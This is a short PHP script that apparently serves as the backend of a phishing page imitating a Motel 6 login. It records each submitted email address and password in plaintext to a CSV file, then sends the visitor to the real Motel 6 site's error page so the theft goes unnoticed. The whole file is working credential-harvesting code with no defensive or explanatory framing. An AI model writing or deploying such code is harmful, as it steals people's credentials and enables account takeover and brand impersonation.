<?php
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';
    
    // Store login attempt in CSV
    $timestamp = date('Y-m-d H:i:s');
    $csvData = [$email, $password, $timestamp];
    $fp = fopen('login_attempts.csv', 'a');
    fputcsv($fp, $csvData);
    fclose($fp);
    
    // Return JSON response
    echo json_encode([
        'success' => true,
        'redirect_url' => 'https://www.motel6.com/en/home/error.html'
    ]);
} else {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
}
?>
